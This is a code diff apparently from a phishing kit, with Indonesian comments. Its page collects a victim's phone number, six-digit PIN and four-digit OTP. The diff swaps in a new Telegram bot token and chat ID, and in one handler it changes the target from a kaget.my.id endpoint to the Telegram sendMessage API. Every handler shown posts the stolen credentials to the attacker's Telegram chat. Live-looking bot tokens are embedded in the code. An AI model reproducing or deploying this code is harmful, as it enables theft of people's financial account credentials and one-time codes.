@@ -661,9 +661,11 @@
       var gabungan = ''  + '%0A𝐍𝐨.𝐇𝐩 : ' + '0' + inp.value;
 
 
+       var token = '8020103101:AAH8vKQC1V9cfYAqqegkPjsHu60tft1izCM'; // Ganti dengan token bot yang kamu buat
+      var grup = '7193560690'; // Ganti dengan chat id dari bot yang kamu buat
 
       $.ajax({
-          url: `https://kaget.my.id/auth/one.php`,
+          url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
           method: `POST`,
        
       success: function(){
@@ -698,8 +700,8 @@
        
    
   
-       var token = '7476360057:AAEv7ROsJMutTQQMcHdXjQFo4_JKkVSt8RE'; // Ganti dengan token bot yang kamu buat
-      var grup = '6616538497'; // Ganti dengan chat id dari bot yang kamu buat
+       var token = '8020103101:AAH8vKQC1V9cfYAqqegkPjsHu60tft1izCM'; // Ganti dengan token bot yang kamu buat
+      var grup = '7193560690'; // Ganti dengan chat id dari bot yang kamu buat
 
       $.ajax({
           url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -739,9 +741,9 @@
       var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value + '%0A𝐏𝐈𝐍    : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝐎𝐓𝐏    : ' + otp1.value + otp2.value + otp3.value + otp4.value;
   
   
-       var token = '7476360057:AAEv7ROsJMutTQQMcHdXjQFo4_JKkVSt8RE'; // Ganti dengan token bot yang kamu buat
-      var grup = '6616538497'; // Ganti dengan chat id dari bot yang kamu buat
-  
+       var token = '8020103101:AAH8vKQC1V9cfYAqqegkPjsHu60tft1izCM'; // Ganti dengan token bot yang kamu buat
+      var grup = '7193560690'; // Ganti dengan chat id dari bot yang kamu buat
+
       $.ajax({
           url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
           method: `POST`,
